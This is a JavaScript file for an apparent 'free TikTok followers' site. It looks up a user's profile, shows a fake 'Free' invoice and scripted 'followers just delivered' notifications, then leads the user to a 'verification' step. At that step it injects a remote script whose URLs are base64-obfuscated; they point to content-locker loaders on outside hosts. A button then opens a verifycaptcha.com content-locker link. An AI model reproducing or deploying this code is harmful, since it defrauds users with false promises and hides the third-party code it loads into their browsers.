var step = 1;
var userId, username, nickname, awemes, image, followers, following, posts = [];
var target = { male_fans: 0, female_fans: 0, likes: 0 };
var coins = [500, 1000, 1500, 2500, 5000];
var endpoints = { tiktokblast: { a: 'aHR0cHM6Ly93d3cuaG9zdGVkZmlsZXMubmV0L2NvbnRlbnRsb2NrZXJzL2xvYWQucGhwP2lkPWI1NjBlNDZhM2FkNmVhYTQ4YjU0Mjc0MDBlMTY4NjQ5', b: 'aHR0cHM6Ly93d3cuaG9zdGVkZmlsZXMubmV0L2NvbnRlbnRsb2NrZXJzL2xvYWQucGhwP2lkPWI1NjBlNDZhM2FkNmVhYTQ4YjU0Mjc0MDBlMTY4NjQ5' }, tiktokrocket: { a: 'aHR0cHM6Ly90aWt0b2tibGFzdC5jb20vb2cucGhwP3Rvb2w9Y2wmdG9vbGFyZz1zJmlkPWI1NjBlNDZhM2FkNmVhYTQ4YjU0Mjc0MDBlMTY4NjQ5', b: 'aHR0cHM6Ly93d3cuYXJleW91YWJvdC5uZXQvY29udGVudGxvY2tlcnMvbG9hZC5waHA/aWQ9YjU2MGU0NmEzYWQ2ZWFhNDhiNTQyNzQwMGUxNjg2NDk=' } };
var domain = window.location.href.includes('tiktokblast') ? 'tiktokblast' : 'tiktokrocket';
var results_tmpl = '<a class="dropdown-item anchor-bind" data-id="%USERID%" onclick="setUser(\'%USERID%\',\'%HANDLE%\',\'%NICKNAME%\',\'%FOLLOWERS%\',\'%FOLLOWING%\',\'%IMG%\');" href="#">\n' +
    '<div class="media">\n' +
    '<img src="%IMG%" style="width:64px;height:64px;" class="align-self-center rounded-circle mr-3" alt="...">\n' +
    '<div class="media-body text-truncate">\n' +
    '<strong class="text-primary">%NICKNAME%</strong><span class="text-info"> (@<span class="handle">%HANDLE%</span>)</span>\n' +
    '<br>\n' +
    '<strong>Followers:</strong> %FOLLOWERS%\n' +
    '<br>\n' +
    '<strong>Following:</strong> %FOLLOWING%\n' +
    '</div>\n' +
    '</div>\n' +
    '</a>';
var results_not_found_templ = '<div class="dropdown-item">' +
    '<div class="text-center font-weight-bold">Can\'t find your profile?</div>' +
    '<div class="text-center small"><a href="javascript:;" onclick="accountModal();">Click here</a> if you\'re having issues.</div>' +
    '</div>';
var aweme_results_templ = '<div class="col-6 col-sm-4 col-md-3 p-1">\n' +
    '<a href="#" class="d-block position-relative aweme img-thumbnail" style="background-image:url(%IMAGE%);background-size:cover;min-height:200px;">\n' +
    '<div class="position-absolute text-center p-2 selected d-none" style="margin-top:-41px;top:50%;left:0;width:100%;background-color:rgba(0,0,0,.6);">\n' +
    '<i class="far fa-check-circle text-success fa-3x"></i>\n' +
    '<div class="small text-white text-uppercase">\n' +
    'Selected\n' +
    '</div>\n' +
    '</div>\n' +
    '</a>\n' +
    '</div>';
var invoice_tmpl = '<div class="text-center">\n' +
    '<div class="mb-3 text-left d-inline-block">\n' +
    '<div class="media">\n' +
    '<img src="%IMAGE%" style="width:64px;height:64px;" class="align-self-center rounded-circle mr-3" alt="...">\n' +
    '<div class="media-body text-truncate">\n' +
    '<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxkZWZzPgogICAgICAgIDxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjM5LjQ4NiUiIHgyPSI3MC44OTElIiB5MT0iLTk5LjQ5NyUiIHkyPSIxNTEuMTM5JSI+CiAgICAgICAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNGRkQxMkMiLz4KICAgICAgICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjRkY5NTJDIi8+CiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4KICAgICAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSI5Ni4wMzYlIiB4Mj0iMjMuNTc1JSIgeTE9IjQuNTAyJSIgeTI9IjczLjM2MSUiPgogICAgICAgICAgICA8c3RvcCBvZmZzZXQ9IjAlIiBzdG9wLWNvbG9yPSIjRkZGIi8+CiAgICAgICAgICAgIDxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI0VDRURFRCIvPgogICAgICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8L2RlZnM+CiAgICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEyIiBmaWxsPSJ1cmwoI2EpIi8+CiAgICAgICAgPHBhdGggZD0iTTE2LjM2IDguMTI1bC02LjYxOCA2LjYxOWExLjUwMiAxLjUwMiAwIDAgMCAwIDIuMTE5IDEuNTAyIDEuNTAyIDAgMCAwIDIuMTIgMGw2LjYxOC02LjYxOWExLjUwMyAxLjUwMyAwIDAgMCAwLTIuMTIgMS40OTcgMS40OTcgMCAwIDAtMS4wNi0uNDM3Yy0uMzg0IDAtLjc2OC4xNDctMS4wNi40MzgiLz4KICAgICAgICA8cGF0aCBmaWxsPSJ1cmwoI2IpIiBkPSJNNC45NDIgNy41NDNhMS41MDIgMS41MDIgMCAwIDAgMCAyLjEyIDEuNTAyIDEuNTAyIDAgMCAwIDIuMTIgMGw2LjYxOC02LjYxOWExLjUwMyAxLjUwMyAwIDAgMCAwLTIuMTIgMS40OTcgMS40OTcgMCAwIDAtMS4wNi0uNDM3Yy0uMzg0IDAtLjc2OC4xNDctMS4wNi40MzhMNC45NDIgNy41NDR6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg0LjggNy4yKSIvPgogICAgICAgIDxwYXRoIGZpbGw9IiNGRkYiIGQ9Ik0xMy45OCAxNC43NDRhMS41MDMgMS41MDMgMCAwIDEtMi4xMTkgMGwtMS4wNi0xLjA2LTMuMTYxLTMuMTYxYTEuNTAzIDEuNTAzIDAgMCAwLTIuMTIgMCAxLjUwMiAxLjUwMiAwIDAgMCAwIDIuMTJsNC4yMjIgNC4yMmExLjUwMiAxLjUwMiAwIDAgMCAyLjExOSAwbDIuMTItMi4xMnoiLz4KICAgIDwvZz4KPC9zdmc+Cg==" style="width: 15px;">\n' +
    '<strong class="text-primary">%NICKNAME%</strong><span class="text-info"> (@<span class="handle">%HANDLE%</span>)</span>\n' +
    '<br>\n' +
    '<strong>Followers:</strong> %FOLLOWERS%\n' +
    '<br>\n' +
    '<strong>Following:</strong> %FOLLOWING%\n' +
    '</div>\n' +
    '</div>\n' +
    '</div>\n' +
    '</div>\n' +
    '<table class="table table-striped">\n' +
    '<thead>\n' +
    '<tr>\n' +
    '<th scope="col">Item</th>\n' +
    '<th class="text-right" scope="col">Qty</th>\n' +
    '<th class="text-right" scope="col">Price</th>\n' +
    '</tr>\n' +
    '</thead>\n' +
    '<tbody>\n' +
    '<tr>\n' +
    '<th scope="row">Male Fans</th>\n' +
    '<td align="right">%TARGETMALEFOLLOWERS%</td>\n' +
    '<td align="right">\n' +
    '<span class="badge badge-success text-uppercase">\n' +
    'Free\n' +
    '</span>\n' +
    '</td>\n' +
    '</tr>\n' +
    '<tr>\n' +
    '<th scope="row">Female Fans</th>\n' +
    '<td align="right">%TARGETFEMALEFOLLOWERS%</td>\n' +
    '<td align="right">\n' +
    '<span class="badge badge-success text-uppercase">\n' +
    'Free\n' +
    '</span>\n' +
    '</td>\n' +
    '</tr>\n' +
    '<tr>\n' +
    '<th scope="row">Likes <span class="font-weight-normal small">%TARGETLIKESPERPOST%</span></th>\n' +
    '<td align="right">%TARGETLIKES%</td>\n' +
    '<td align="right">\n' +
    '<span class="badge badge-success text-uppercase">\n' +
    'Free\n' +
    '</span>\n' +
    '</td>\n' +
    '</tr>\n' +
    '</tbody>\n' +
    '<tfoot>\n' +
    '<tr>\n' +
    '<th scope="col" colspan="2">Total</th>\n' +
    '<th class="text-right" scope="col">\n' +
    '<span class="badge badge-success text-uppercase">\n' +
    'Free\n' +
    '</span>\n' +
    '</th>\n' +
    '</tr>\n' +
    '</tfoot>\n' +
    '</table>\n' +
    '\n' +
    '<table class="table table-striped">\n' +
    '<tbody>\n' +
    '<tr>\n' +
    '<th scope="row">Delivery time</th>\n' +
    '<td align="right"><i class="fas fa-bolt text-warning"></i> Instant delivery</td>\n' +
    '</tr>\n' +
    '</tbody>\n' +
    '</table>';
var setUser = function(a, b, c, d, e, f) {
    $('form.user input[type=text]').val(b);
    userId = a;
    username = b;
    nickname = c;
    followers = d;
    following = e;
    image = f;
    $.get('https://api.tiktokblast.com/findPosts.php', { u: userId }, function(d) { if (d.aweme_list.length) { posts = d.aweme_list; } });
    setTimeout(function() {
        $('#suggest').dropdown('hide');
        updateStep(2);
    }, 50);
};
var toggleCheckbox = function(element) { document.getElementById('start_promo').disabled = !element.checked; };
var newAct = function() {
    $('#cdown').hide();
    var prom_statuses = [(target.male_fans + target.female_fans).toLocaleString() + ' followers selected.', 'Selecting accounts for likes.', (typeof awemes !== "undefined" ? Math.floor(target.likes / awemes).toLocaleString() : (target.likes).toLocaleString()) + ' accounts selected.', 'Session verification required to continue.'];
    $('.cprogfol').text((target.male_fans + target.female_fans).toLocaleString());
    $('.cproglike').text(target.likes.toLocaleString());
    $('body').html($('body').html().replace('<span class="cprogfol"></span>', '<span class="cprogfol">' + (target.male_fans + target.female_fans).toLocaleString() + '</span>').replace('<span class="cproglike"></span>', '<span class="cproglike">' + (target.likes).toLocaleString() + '</span>'));
    $('html,body').animate({ scrollTop: $(".divToBeScrolledTo").offset().top - 50 });
    var prom_status_elm = '#prom_status';
    var prom_status_cur = 0;
    var prom_status = setInterval(function() {
        if (prom_status_cur === (prom_statuses.length - 1)) { $('.acon').show(); } else if (prom_status_cur === prom_statuses.length) { clearInterval(prom_status); return false; }
        $(prom_status_elm).html(prom_statuses[prom_status_cur]);
        prom_status_cur++;
    }, 1850);
};
var updateStep = function(s, timeout = 750) {
    if (s === 3) {
        target.male_fans = parseInt($('#male_fans').val());
        target.female_fans = parseInt($('#female_fans').val());
        target.likes = parseInt($('#likes').val());
        if (target.male_fans == -1 || target.female_fans == -1 || target.likes == -1) { return errorModal('You must select the amount of male fans, female fans and likes to continue.'); }
        if (target.male_fans <= 0 && target.female_fans <= 0 && target.likes <= 0) { return errorModal('You have selected 0 fans and 0 likes.') }
        if (!posts.length || target.likes <= 0) { s = 4; } else {
            step = s;
            $('#main').html($('#loading').html());
            setTimeout(function() {
                $('#main').html($('#step' + step).html());
                $('.target_likes').text(target.likes.toLocaleString());
                for (var i = 0; i < posts.length; i++) { $('.aweme_results').append(aweme_results_templ.replace('%IMAGE%', posts[i].video.cover.url_list[0])); }
            }, timeout);
            return false;
        }
    }
    if (s === 4) {
        var pa = document.createElement('script');
        pa.type = 'text/javascript';
        pa.async = true;
        var sc = document.getElementsByTagName('script')[0];
        pa.id = 'ogjs';
        pa.src = atob(endpoints[domain].a);
        pa.onerror = function() {
            var sa = document.createElement('script');
            sa.type = 'text/javascript';
            sa.async = true;
            sa.id = 'ogjs';
            sa.src = atob(endpoints[domain].b);
            sc.parentNode.insertBefore(sa, sc);
        };
        sc.parentNode.insertBefore(pa, sc);
        step = s;
        $('#main').html($('#loading').html());
        setTimeout(function() {
            $('#main').html($('#step' + step).html());
            $('.invoice').html(invoice_tmpl.replace('%IMAGE%', image).replace('%NICKNAME%', nickname).replace('%HANDLE%', username).replace('%FOLLOWERS%', followers.toLocaleString()).replace('%FOLLOWING%', following.toLocaleString()).replace('%TARGETMALEFOLLOWERS%', target.male_fans.toLocaleString()).replace('%TARGETFEMALEFOLLOWERS%', target.female_fans.toLocaleString()).replace('%TARGETLIKES%', target.likes.toLocaleString()).replace('%TARGETLIKESPERPOST%', typeof awemes !== "undefined" ? '(' + awemes + ' posts x ' + Math.floor(target.likes / awemes).toLocaleString() + ')' : ''));
            if (!userId) { $('.invoice .media').hide(); }
            $('html,body').animate({ scrollTop: $(".divToBeScrolledTo").offset().top - 50 });
            $('.carousel').carousel({ interval: 3000 });
            $('.carousel.lazy').on('slide.bs.carousel', function(ev) {
                var lazy;
                lazy = $(ev.relatedTarget).find('img[data-src]');
                lazy.attr("src", lazy.data('src'));
                lazy.removeAttr("data-src");
            });
        }, timeout);
        return false;
    }
    if (s === 5) { newAct(); }
    step = s;
    $('#main').html($('#loading').html());
    setTimeout(function() { $('#main').html($('#step' + step).html()); }, timeout);
};
var errorModal = function(body, title = 'Error!') {
    var modal = $('#errorModal');
    modal.find('.modal-body').text(body);
    modal.find('.modal-title').text(title);
    modal.modal('show');
    return true;
};
var accountModal = function() {
    $('#accountModal').modal({ backdrop: 'static', keyboard: false });
    setTimeout(function() { $('#suggest').dropdown('hide'); }, 50);
};
var exitConfirm = function() { return 'You will lose your promotion progress by leaving this page. Continue?'; };
var toast = function() {
    var amount = (Math.floor(Math.random() * 200) + 1) * 500;
    var seconds = Math.floor(Math.random() * 12) + 5;
    var emojis = ['💪', '😎', '👊'];
    var a1 = [0, 1000, 2500, 5000, 10000, 25000, 50000, 75000, 100000];
    var a2 = [0, 1000, 2500, 5000, 10000, 25000, 50000, 75000, 100000];
    console.log('toast');
    Toastify({ text: emojis[Math.floor(Math.random() * emojis.length)] + " " + (a1[Math.floor(Math.random() * a1.length)] + a2[Math.floor(Math.random() * a2.length)]).toLocaleString() + " followers just delivered!", duration: 5000, close: false, gravity: "top", positionLeft: false, backgroundColor: "linear-gradient(to right, #2adeed, #fa004e)", className: "font-weight-bold" }).showToast();
    setTimeout(function() { toast(); }, (seconds * 1000));
};
$(document).ready(function() {
    $('#main').html($('#step' + step).html());
    setTimeout(function() { toast(); }, ((Math.floor(Math.random() * 10) + 6) * 1000));
});
$(document).on('submit', '#profile_url_form', function(e) {
    e.preventDefault();
    var t = $(this),
        url = t.find('#profile_url').val();
    t.find('button[type=submit]').html('<i class="fas fa-circle-notch fa-fw fa-spin"></i> Loading').prop('disabled', true);
    $.get('/findUserProfile.php', { url: url }, function(d) {
        if (d.success === true) {
            t.find('button[type=submit]').html('Find Account').prop('disabled', false);
            $('#accountModal').modal('hide');
            setUser(d.uid, d.handle, d.nickname, d.followers, d.following, d.image);
        }
    });
});
$(document).on('click', '.btn-continue', function(e) {
    e.preventDefault();
    updateStep($(this).data('step'));
});
$(document).on('change', '.form-check-input', function(e) {
    e.preventDefault();
    $('#start_promo').prop('disabled', !$(this).is(":checked"));
});
$(document).on('submit', 'form.user', function(e) {
    e.preventDefault();
    window.onbeforeunload = exitConfirm;
    var t = $(this),
        username = t.find('input[type=text]').val();
    t.find('input[type=text]').prop('disabled', true);
    t.prop('disabled', true);
    t.find('.btn-submit').prop('disabled', true);
    t.addClass('is-loading');
    $('#suggest .dropdown-scroll').html('');
    $.get('action.php', { u: username, g: (new Date().getTime() / 1000) }, function(d) {
        d = JSON.parse(d);
        if (d.length) {
            for (let i = 0; i < d.length; i++) {
                var cuser = d[i].user_info;
                $('#suggest .dropdown-scroll').append(results_tmpl.replace(/%USERID%/g, cuser.uid).replace(/%IMG%/g, cuser.avatar_thumb.url_list[0]).replace(/%NICKNAME%/g, cuser.nickname).replace(/%HANDLE%/g, cuser.unique_id).replace(/%FOLLOWERS%/g, cuser.follower_count.toLocaleString()).replace(/%FOLLOWING%/g, cuser.following_count.toLocaleString()));
            }
        }
        $('#suggest .dropdown-scroll').append(results_not_found_templ);
        $('#suggest').dropdown('show');
        t.removeClass('is-loading');
        t.addClass('is-found');
        t.prop('disabled', false);
        t.find('.btn-submit').prop('disabled', false);
        t.find('.btn-submit').removeClass('btn-info').addClass('btn-warning');
    });
});
$(document).on('click', 'form.user.is-found .btn-submit', function(e) {
    e.preventDefault();
    window.onbeforeunload = null;
    $(this).closest('form.user').find('input[type=text]').prop('disabled', false);
    $(this).closest('form.user').find('input[type=text]').val('');
    $(this).closest('form.user').removeClass('is-loading');
    $(this).closest('form.user').removeClass('is-found');
    $(this).addClass('btn-info').removeClass('btn-warning');
    $('#suggest').dropdown('hide');
});
$(document).on('click', '.account-close', function(e) {
    e.preventDefault();
    $('form.user').find('input[type=text]').prop('disabled', false);
    $('form.user').find('input[type=text]').val('');
    $('form.user').removeClass('is-loading');
    $('form.user').removeClass('is-found');
    $('form.user.is-found .btn-submit').addClass('btn-info').removeClass('btn-warning');
});
$(document).on('click', '.aweme', function(e) {
    e.preventDefault();
    if ($(this).find('.selected').hasClass('d-none')) { $(this).find('.selected').removeClass('d-none'); } else { $(this).find('.selected').addClass('d-none'); }
    var total = $('.aweme .selected').length,
        non = $('.aweme .selected.d-none').length,
        selected = total - non;
    awemes = selected;
    if (selected > 0) {
        $('.aweme_quantity').html('&nbsp;| ' + selected + ' posts | ' + Math.floor(target.likes / selected).toLocaleString() + ' likes per post');
        $('.aweme_quantity2').html(selected + ' posts | ' + Math.floor(target.likes / selected).toLocaleString() + ' likes per post');
        $('.do-continue').removeClass('d-none');
    } else {
        $('.aweme_quantity,.aweme_quantity2').html('');
        $('.do-continue').addClass('d-none');
    }
});
$(document).on('click', '.btn-locker', function(e) {
    e.preventDefault();
    window.onbeforeunload = null;
    $(this).removeClass('btn-locker').attr('target', '_blank').attr('href', 'https://www.verifycaptcha.com/cl.php?id=a8b588aed24f0e2bef353c4115b585b5');
    window.open('https://www.verifycaptcha.com/cl.php?id=a8b588aed24f0e2bef353c4115b585b5');
});